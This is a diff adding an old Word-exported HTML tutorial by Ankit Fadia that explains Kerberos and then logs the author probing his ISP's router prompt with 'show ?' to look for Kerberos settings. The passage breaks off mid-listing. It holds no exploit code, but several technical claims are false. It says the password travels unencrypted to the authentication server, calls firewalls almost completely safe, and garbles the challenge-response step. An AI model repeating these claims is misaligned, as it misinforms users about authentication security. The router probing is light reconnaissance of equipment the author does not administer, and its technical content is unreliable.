@@ -1,0 +1,782 @@
+<html xmlns:o="urn:schemas-microsoft-com:office:office"
+xmlns:w="urn:schemas-microsoft-com:office:word"
+xmlns="http://www.w3.org/TR/REC-html40">
+
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
+<meta name=ProgId content=Word.Document>
+<meta name=Generator content="Microsoft Word 9">
+<meta name=Originator content="Microsoft Word 9">
+<link rel=File-List href="./kerberos_files/filelist.xml">
+<title>Hacking Truths--What They Don't Teach In Manuals!!! By Ankit Fadia
+ankit@bol.net.in Send an email to: programmingforhackers-subscribe@egroups.com
+to recive more tutorials.</title>
+<!--[if gte mso 9]><xml>
+ <o:DocumentProperties>
+  <o:Author>Ankit Fadia</o:Author>
+  <o:Template>Normal</o:Template>
+  <o:LastAuthor>Ankit Fadia</o:LastAuthor>
+  <o:Revision>2</o:Revision>
+  <o:TotalTime>115</o:TotalTime>
+  <o:Created>2000-07-13T11:22:00Z</o:Created>
+  <o:LastSaved>2000-07-13T11:22:00Z</o:LastSaved>
+  <o:Pages>6</o:Pages>
+  <o:Words>2318</o:Words>
+  <o:Characters>13215</o:Characters>
+  <o:Company>Hacking Truths</o:Company>
+  <o:Lines>110</o:Lines>
+  <o:Paragraphs>26</o:Paragraphs>
+  <o:CharactersWithSpaces>16228</o:CharactersWithSpaces>
+  <o:Version>9.2720</o:Version>
+ </o:DocumentProperties>
+</xml><![endif]--><!--[if gte mso 9]><xml>
+ <w:WordDocument>
+  <w:DisplayHorizontalDrawingGridEvery>0</w:DisplayHorizontalDrawingGridEvery>
+  <w:DisplayVerticalDrawingGridEvery>0</w:DisplayVerticalDrawingGridEvery>
+  <w:UseMarginsForDrawingGridOrigin/>
+  <w:Compatibility>
+   <w:FootnoteLayoutLikeWW8/>
+   <w:ShapeLayoutLikeWW8/>
+   <w:AlignTablesRowByRow/>
+   <w:ForgetLastTabAlignment/>
+   <w:LayoutRawTableWidth/>
+   <w:LayoutTableRowsApart/>
+  </w:Compatibility>
+ </w:WordDocument>
+</xml><![endif]-->
+<style>
+<!--
+ /* Style Definitions */
+p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{mso-style-parent:"";
+	margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:10.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";}
+h1
+	{mso-style-next:Normal;
+	margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	page-break-after:avoid;
+	mso-outline-level:1;
+	font-size:10.0pt;
+	font-family:"Times New Roman";
+	mso-font-kerning:0pt;}
+a:link, span.MsoHyperlink
+	{color:blue;
+	text-decoration:underline;
+	text-underline:single;}
+a:visited, span.MsoHyperlinkFollowed
+	{color:purple;
+	text-decoration:underline;
+	text-underline:single;}
+@page Section1
+	{size:8.5in 11.0in;
+	margin:1.0in 1.25in 1.0in 1.25in;
+	mso-header-margin:.5in;
+	mso-footer-margin:.5in;
+	mso-paper-source:0;}
+div.Section1
+	{page:Section1;}
+ /* List Definitions */
+@list l0
+	{mso-list-id:771978749;
+	mso-list-type:hybrid;
+	mso-list-template-ids:-1728431286 -692972270 67698713 67698715 67698703 67698713 67698715 67698703 67698713 67698715;}
+@list l0:level1
+	{mso-level-text:"%1\.\)";
+	mso-level-tab-stop:.5in;
+	mso-level-number-position:left;
+	text-indent:-.25in;}
+@list l1
+	{mso-list-id:2016153380;
+	mso-list-type:hybrid;
+	mso-list-template-ids:-1917152176 1314390644 67698713 67698715 67698703 67698713 67698715 67698703 67698713 67698715;}
+@list l1:level1
+	{mso-level-text:"%1\.\)";
+	mso-level-tab-stop:.5in;
+	mso-level-number-position:left;
+	text-indent:-.25in;}
+ol
+	{margin-bottom:0in;}
+ul
+	{margin-bottom:0in;}
+-->
+</style>
+</head>
+
+<body lang=EN-US link=blue vlink=purple style='tab-interval:.5in'>
+
+<div class=Section1>
+
+<p class=MsoNormal>________________________________________________________________</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal><b>Kerberos Torn Apart By Ankit Fadia</b> <a
+href="mailto:ankit@bol.net.in">ankit@bol.net.in</a></p>
+
+<br>
+
+<p class=MsoNormal>________________________________________________________________</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Now days, almost all networks have firewalls installed to
+protect them from the dangers of the un-trusted outside world of the Internet.
+When firewalls first came to the scene, they were nowhere near good enough to
+protect the Network completely. However, with the passage of time, the quality
+of firewalls has increased to such a level that the present day firewall
+systems make the internal trusted network almost 100% safe. </p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>They can easily be configured to allow only certain kinds of
+data to pass through and even can be used to set which ports can be accessed
+from the un-trusted network (Internet) and which ports are accessible from the
+internal trusted network. Some good ones also scan all attachments going in and
+out for viruses and ensure that no confidential data is going out of the company.
+The present day firewalls have really made life quite easier for the system
+administrating by giving more than a little protection from the Outside world.
+However, one area where the firewalls falter is if the attach is from within
+the trusted internal network or in other words, the attacker is doing something
+wrong, something which he is not supposed to do from within the network and not
+through the Internet. </p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Say for example, you have a well configured; firewall
+installed at your company’s main server and it scans all incoming email
+attachments for viruses. Now, if you get a virus attach from outside the
+internal trusted network and though the Internet, then normally the firewall
+will either delete or warn you about it. However, if the virus coder, is
+working for you and is within the internal trusted network, then a firewall
+would not be able to do anything about it and the virus will spread quite
+easily. </p>
+
+<p class=MsoNormal>NOTE: The above is just an example taken to ensure that you
+understand. </p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>So, now, I hope you realize that only a Firewall is not
+sufficient for a network and it also requires something for attacks from
+internal systems.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>This is where the Kerberos comes in. Kerberos is a network
+authentication protocol, which provides for the verification of identities
+within a heterogeneous distributed networked environment. It is the de facto
+standard for authentication, which gets it name from the three-headed dog in
+Greek Mythology. </p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>For complete reference and details about Kerberos
+authentication protocol, refer to the RFC 1510</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Now, within an internal network, the greatest danger lies in
+the fact that anyone can easily pick up or sniff out confidential data like
+company plans, passwords and even credit card numbers while this data is being
+transferred from one system to another within the same network. </p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Let us take an example, to understand better. Say, you are
+on a client, which is connected to the main server, which provides services to
+all clients connected to it.<span style="mso-spacerun: yes">  </span>Now, when
+you connect to the server to check your mail, then your email client sends your
+Username and Password to the internal network server, so that you can be
+authenticated. You may say that this is pretty much safe and how can it
+possible harm me? Well, you are wrong. Now, when your machine sends your
+Username and Password to the server, then this information does not reach the
+destination server directly. The data has to pass through other machines and
+sometimes if your network is large, then even through other servers before it
+reaches the destination.<span style="mso-spacerun: yes">  </span>Now, anyone
+having access to those systems through which your data passes through, can
+easily sniff out your data and in this case can find out your Username and
+Password, using which he can check your mail. </p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>To solve all the above problems (and many more) there is the
+Kerberos. The Kerberos not only ensures that no one sniffs data out, but also
+ensures the integrity of the client and server to prevent impersonation. This
+basically means that it ensures that no one can fool the server into thinking
+that it is some other system.</p>
+
+<p class=MsoNormal>Now, to understand how exactly, Kerberos proves to be as
+good as it is, let us learn how the Kerberos protocol works.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>The most popular Network Authentication providing software,
+Kerberos is constituted of 3 main parts or sections-:</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal style='margin-left:.5in;text-indent:-.25in;mso-list:l1 level1 lfo1;
+tab-stops:list .5in'><![if !supportLists]>1.)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span><![endif]>The Authentication Server or AS</p>
+
+<p class=MsoNormal style='margin-left:.5in;text-indent:-.25in;mso-list:l1 level1 lfo1;
+tab-stops:list .5in'><![if !supportLists]>2.)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span><![endif]>The Ticket Granting Server or TGS</p>
+
+<p class=MsoNormal style='margin-left:.5in;text-indent:-.25in;mso-list:l1 level1 lfo1;
+tab-stops:list .5in'><![if !supportLists]>3.)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span><![endif]>The Actual Encryption process or algorithm</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>In a Network with Kerberos installed or enabled, the
+Authentication Server or the AS acts as the head or the central unit, which
+ensures the authenticity of the client and server and also prevents data
+sniffing. </p>
+
+<p class=MsoNormal>One good thing about the Kerberos Authentication system is
+that is a dual-authentication system, which means that it not allows the server
+to verify the identity of the client but also vise-a-versa.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>The Authentication Server acts as the secretary of both the
+client and the server. The client and the server in order to communicate with
+each other, have to have a connection with the AS. (The AS verifies identities
+of both the client and the server.) Only once the AS has verified the
+authenticity of both the client and the server, can they start to communicate
+with each other.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<h1>Kerberos: The Working</h1>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>So when does Kerberos jump in? Well, as soon as you want to
+login and type in your Username in the space provided. As soon as you type the
+confidential information, the Kerberos sends it to the Authentication Server or
+the AS. Then, the AS replies to the client with the session key and something
+called the Ticket Granting Ticket. Both the session key and the Ticket Granting
+ticket are encrypted by the user’s key. Now, before we go on, I think there is
+need to explain certain things involved in the above process.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Now, you must remember that the client and the
+Authentication Server and the client share an encryption key, which is used to
+encrypt data. This encrypted data is understandable (de-cryptable) by only the
+AS and the client. This encryption key is generated from the User’s Password.
+This means that, passing the User’s password through a certain predefined
+formula derives this encryption key. Similarly all Servers, which provide
+services to clients, share an encryption key with the AS.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>So this system of client-AS and server-AS encryption keys
+ensures that no one else can sniff the data.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Now, we come to the Ticket Granting Ticket, which is sent
+along with the session key[The session key is sent to the client by the AS, so
+that the client can start to communicate with the Ticket Granting Server or
+TGS.] to the client by the AS. A ticket is nothing but a certificate of
+authenticity given to the client by the AS to prevent impersonation. The ticket
+is readable only by the client system for which it is meant to be and the AS.
+The Ticket Granting Ticket also makes the Kerberos system efficient as it
+removes the need of repeating the initial process again and again.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Now, once the client receives the session key and the TG
+Ticket, it derives the client’s key from the user’s password and tries to use
+this generated key to decrypt the TG Ticket and the Ticket Granting Server key
+or the TGS key. If the client is able to decrypt these two, then the password
+is correct else wrong.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Now, say you want to then, use the POP services of the mail
+server to read your mail, then what happens is that, the client sends a request
+to The Ticket Granting Server or TGS. The client encrypts important network
+information and details about the request with the TGS key and sends this
+encrypted data to it.</p>
+
+<p class=MsoNormal>If this is found to be valid, then TGS issues a ticket to
+the client which contains the following-:</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal style='margin-left:.5in;text-indent:-.25in;mso-list:l0 level1 lfo2;
+tab-stops:list .5in'><![if !supportLists]>1.)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span><![endif]>Username</p>
+
+<p class=MsoNormal style='margin-left:.5in;text-indent:-.25in;mso-list:l0 level1 lfo2;
+tab-stops:list .5in'><![if !supportLists]>2.)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span><![endif]>Address</p>
+
+<p class=MsoNormal style='margin-left:.5in;text-indent:-.25in;mso-list:l0 level1 lfo2;
+tab-stops:list .5in'><![if !supportLists]>3.)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span><![endif]>Service Name</p>
+
+<p class=MsoNormal style='margin-left:.5in;text-indent:-.25in;mso-list:l0 level1 lfo2;
+tab-stops:list .5in'><![if !supportLists]>4.)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span><![endif]>Lifespan</p>
+
+<p class=MsoNormal style='margin-left:.5in;text-indent:-.25in;mso-list:l0 level1 lfo2;
+tab-stops:list .5in'><![if !supportLists]>5.)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span><![endif]>Timestamp</p>
+
+<p class=MsoNormal style='margin-left:.5in;text-indent:-.25in;mso-list:l0 level1 lfo2;
+tab-stops:list .5in'><![if !supportLists]>6.)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span><![endif]>Other Session Key details.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>An important thing to note here is that, for communication
+between the client and the server to actually take place, they should share the
+same key.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>The TGS generates two copies of this session key, one
+encrypted with TGS key for the client and the other with application server
+key. Using the TGS key, the client then, decrypts the session key meant for it,
+and the session key for the application server is sent to the destination.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>When the server receives the session key, and once it is
+decrypted, it knows that this particular client is trying to contact it. The
+server too has a procedure to ensure the authenticity of the client. It sends a
+random number in plain text to the client. The client then decrypts it with the
+session key (which they both have in common) and sends it back to the server.
+On receiving this encrypted text, it can ensure that the client is not an
+impersonator, as some other client cannot perform the same encryption.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Kerberos ensures that Sniffing out data is not that easy, as
+transfer of all data, even the Keys, is done in encrypted form. The encryption
+technique used by Kerberos is Data Encryption Algorithm or DES.</p>
+
+<p class=MsoNormal>However, there is still a slight hole in the Kerberos
+system. You see, during the time when the Password is sent to the AS in the
+first step, it travels through the Network in unencrypted form. This is one
+time, when the Kerberos system can be exploited.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Windows 2000 is I think the first Operating System, which
+uses Kerberos as the standard authentication method. Anyway, now that you know
+how exactly, the Kerberos Authentication System works, let us move on to how to
+find out if your ISP is running it or not? Also, I highly recommend reading the
+RFC 1510. This is for those who want even the tiniest of details about this
+system.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<h1>How do I find out if my ISP is running Kerberos?</h1>
+
+<p class=MsoNormal><b><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></b></p>
+
+<p class=MsoNormal>NOTE: In this section, I am assuming that you have enabled
+the Bring Up the Post Dial Up Screen option.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Well, the router of your ISP to which you initially connect
+to, holds the key. Almost all of you must have seen the Post Dial Up Screen,
+which comes up, where you have to enter your Username and Password. Now, this
+Post Dial Up Screen is actually your ISP’s router prompt. There is a secret
+(Well, not exactly secret) router command, which will let you find out if your
+ISP has implemented the Kerberos protocol.</p>
+
+<p class=MsoNormal>The following is a log which contains my comments of what I
+did to find out whether my ISP is using Kerberos or not.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>User Access Verification</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Username: ankit</p>
+
+<p class=MsoNormal>Password: </p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>NP-NAS3&gt;help</p>
+
+<p class=MsoNormal>Help may be requested at any point in a command by entering</p>
+
+<p class=MsoNormal>a question mark '?'.<span style="mso-spacerun: yes"> 
+</span>If nothing matches, the help list will</p>
+
+<p class=MsoNormal>be empty and you must backup until entering a '?' shows the</p>
+
+<p class=MsoNormal>available options.</p>
+
+<p class=MsoNormal>Two styles of help are provided:</p>
+
+<p class=MsoNormal>1. Full help is available when you are ready to enter a</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">   </span>command argument
+(e.g. 'show ?') and describes each possible</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">   </span>argument.</p>
+
+<p class=MsoNormal>2. Partial help is provided when an abbreviated argument is
+entered</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">   </span>and you want to
+know what arguments match the input</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">   </span>(e.g. 'show pr?'.)</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>[Ankit: help is not the right command, let me try ‘?’]</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>NP-NAS3&gt;?</p>
+
+<p class=MsoNormal>Exec commands:</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>access-enable<span
+style="mso-spacerun: yes">    </span>Create a temporary Access-List entry</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>access-profile<span
+style="mso-spacerun: yes">   </span>Apply user-profile to interface</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>attach<span
+style="mso-spacerun: yes">           </span>attach to system component</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>clear<span
+style="mso-spacerun: yes">            </span>Reset functions</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>connect<span
+style="mso-spacerun: yes">          </span>Open a terminal connection</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>disable<span
+style="mso-spacerun: yes">          </span>Turn off privileged commands</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>disconnect<span
+style="mso-spacerun: yes">       </span>Disconnect an existing network
+connection</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>enable<span
+style="mso-spacerun: yes">           </span>Turn on privileged commands</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>exit<span
+style="mso-spacerun: yes">             </span>Exit from the EXEC</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>help<span
+style="mso-spacerun: yes">             </span>Description of the interactive
+help system</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>lat<span
+style="mso-spacerun: yes">              </span>Open a lat connection</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>lock<span
+style="mso-spacerun: yes">             </span>Lock the terminal</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>login<span
+style="mso-spacerun: yes">            </span>Log in as a particular user</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>logout<span
+style="mso-spacerun: yes">           </span>Exit from the EXEC</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>mrinfo<span
+style="mso-spacerun: yes">           </span>Request neighbor and version
+information from a multicast</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">                  
+</span>router</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>mstat<span
+style="mso-spacerun: yes">            </span>Show statistics after multiple
+multicast traceroutes</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>mtrace<span
+style="mso-spacerun: yes">           </span>Trace reverse multicast path from
+destination to source</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes"> 
+</span>name-connection<span style="mso-spacerun: yes">  </span>Name an existing
+network connection</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>pad<span
+style="mso-spacerun: yes">              </span>Open a X.29 PAD connection</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>ping<span
+style="mso-spacerun: yes">             </span>Send echo messages</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes"> </span>ppp<span
+style="mso-spacerun: yes">              </span>Start IETF Point-to-Point Protocol
+(PPP)</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>resume<span
+style="mso-spacerun: yes">           </span>Resume an active network connection</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>rlogin<span
+style="mso-spacerun: yes">           </span>Open an rlogin connection</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>set<span
+style="mso-spacerun: yes">              </span>Set system parameter (not
+config)</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>show<span
+style="mso-spacerun: yes">             </span>Show running system information</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>slip<span
+style="mso-spacerun: yes">             </span>Start Serial-line IP (SLIP)</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>systat<span
+style="mso-spacerun: yes">           </span>Display information about terminal
+lines</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>telnet<span
+style="mso-spacerun: yes">           </span>Open a telnet connection</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>terminal<span
+style="mso-spacerun: yes">         </span>Set terminal line parameters</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>tn3270<span
+style="mso-spacerun: yes">           </span>Open a tn3270 connection</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>traceroute<span
+style="mso-spacerun: yes">       </span>Trace route to destination</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>tunnel<span
+style="mso-spacerun: yes">           </span>Open a tunnel connection</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>where<span
+style="mso-spacerun: yes">            </span>List active connections</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>x28<span
+style="mso-spacerun: yes">              </span>Become an X.28 PAD</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>x3<span
+style="mso-spacerun: yes">               </span>Set X.3 parameters on PAD</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>xremote<span
+style="mso-spacerun: yes">          </span>Enter XRemote mode</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>[Ankit: Well, I tried a few more commands, but you do not
+have to do any experimentation, as I have already done it for you. The useful
+command here is: ‘show’, so let u see what help it provides us.]</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>NP-NAS3&gt;show ?</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>alps<span
+style="mso-spacerun: yes">            </span>Alps information</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>backup<span
+style="mso-spacerun: yes">          </span>Backup status</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>bootflash:<span
+style="mso-spacerun: yes">      </span>display information about bootflash:
+file system</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>calendar<span
+style="mso-spacerun: yes">        </span>Display the hardware calendar</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>call<span
+style="mso-spacerun: yes">            </span>Show Calls</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>clock<span
+style="mso-spacerun: yes">           </span>Display the system clock</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>context<span
+style="mso-spacerun: yes">         </span>Show context information about recent
+crash(s)</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>cot<span
+style="mso-spacerun: yes">             </span>COT connection information</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>dial-peer<span
+style="mso-spacerun: yes">       </span>Dial Plan Mapping Table for, e.g. VoIP
+Peers</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>dialer<span
+style="mso-spacerun: yes">          </span>Dialer parameters and statistics</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>drip<span
+style="mso-spacerun: yes">            </span>DRiP DB</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>exception<span
+style="mso-spacerun: yes">       </span>exception informations</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>facility-alarm<span
+style="mso-spacerun: yes">  </span>Facility Alarm status</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>flash:<span
+style="mso-spacerun: yes">          </span>display information about flash:
+file system</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>fras-host<span
+style="mso-spacerun: yes">       </span>FRAS Host Information</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>gateway<span
+style="mso-spacerun: yes">         </span>Show status of gateway</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>history<span
+style="mso-spacerun: yes">         </span>Display the session command history</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>hosts<span
+style="mso-spacerun: yes">           </span>IP domain-name, lookup style,
+nameservers, and host table</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>kerberos<span
+style="mso-spacerun: yes">        </span>Show Kerberos Values</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>location<span
+style="mso-spacerun: yes">        </span>Display the system location</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>management<span
+style="mso-spacerun: yes">      </span>Display the management applications</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>modem<span
+style="mso-spacerun: yes">           </span>Modem Management or CSM information</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes"> </span>modemcap<span
+style="mso-spacerun: yes">        </span>Show Modem Capabilities database</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>ncia<span
+style="mso-spacerun: yes">       </span><span style="mso-spacerun:
+yes">     </span>Native Client Interface Architecture</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>num-exp<span
+style="mso-spacerun: yes">         </span>Number Expansion (Speed Dial)
+information</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>ppp<span
+style="mso-spacerun: yes">             </span>PPP parameters and statistics</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>queue<span
+style="mso-spacerun: yes">           </span>Show queue contents</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>queueing<span
+style="mso-spacerun: yes">        </span>Show queueing configuration</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>rmon<span
+style="mso-spacerun: yes">            </span>rmon statistics</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>rtr<span
+style="mso-spacerun: yes">             </span>Response Time Reporter (RTR)</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>sessions<span
+style="mso-spacerun: yes">        </span>Information about Telnet connections</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>sgbp<span
+style="mso-spacerun: yes">            </span>SGBP group information</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>snmp<span
+style="mso-spacerun: yes">            </span>snmp statistics</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>syscon<span
+style="mso-spacerun: yes">          </span>System Controller information</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>tacacs<span
+style="mso-spacerun: yes">          </span>Shows tacacs+ server statistics </p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>tdm<span
+style="mso-spacerun: yes">             </span>TDM connection information</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>terminal<span
+style="mso-spacerun: yes">        </span>Display terminal configuration
+parameters</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>traffic-shape<span
+style="mso-spacerun: yes">   </span>traffic rate shaping configuration</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>users<span
